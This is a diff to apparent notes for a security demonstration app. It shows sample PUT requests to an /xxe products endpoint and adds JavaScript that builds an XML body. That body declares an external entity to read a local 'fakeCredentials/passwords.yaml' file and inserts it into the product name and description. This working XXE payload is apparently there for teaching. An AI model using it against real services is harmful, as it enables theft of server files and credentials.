@@ -23,3 +23,62 @@ Response:
     "price": 333.6,
     "description": "The new model of popular phone"
 }
+
+Request:
+PUT /xxe/products/1 HTTP/1.1
+Host: localhost:8080
+Content-Type: text/plain
+Content-Length: 320
+
+<?xml version="1.0" encoding="UTF-8"?>
+<Product>
+    <name>mobile phone 2022</name>
+    <description>The new model of popular phone</description>
+    <price>2334.6</price>
+    <category>Phone</category>
+</Product>
+
+Request:
+PUT /xxe/products/1 HTTP/1.1
+Host: localhost:8080
+Content-Type: text/plain
+Content-Length: 320
+
+<?xml version="1.0" encoding="UTF-8"?>
+<Product>
+    <name>mobile phone 2022</name>
+    <description>The new model of popular phone</description>
+    <price>334.6</price>
+    <category>Phone</category>
+</Product>
+
+Request:
+PUT /xxe/products/2 HTTP/1.1
+Host: localhost:8080
+Content-Type: text/plain
+Content-Length: 320
+<?xml version="1.0" encoding="UTF-8"?>
+<Product>
+    <name>laptop 2021</name>
+    <description>The latest stable model of this brand</description>
+    <price>2334.6</price>
+    <category>Laptops</category>
+</Product>
+
+New Code
+const prepareXmlRequest = (productName, description, price) => {
+    let xmlReqBody = `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE yhn [ <!ENTITY xxe SYSTEM "file:///C:%5CUsers%5CYalchan%20Niyaziev%5CDocuments%5Cyhn_projects%5CMaster_CyberSecurity%5Cweb-app-security-vulnerabilities-demonstration-app%5CfakeCredentials%5Cpasswords.yaml"> ]><Product>`;
+
+    if (productName) {
+        xmlReqBody = xmlReqBody.concat(`<name>&xxe;</name>`);
+    }
+    if (description) {
+        xmlReqBody = xmlReqBody.concat(`<description>&xxe;</description>`);
+    }
+    if (price) {
+        xmlReqBody = xmlReqBody.concat(`<price>${price}</price>`);
+    }
+    xmlReqBody = xmlReqBody.concat(`</Product>`)
+    console.log(xmlReqBody);
+    return xmlReqBody;
+}
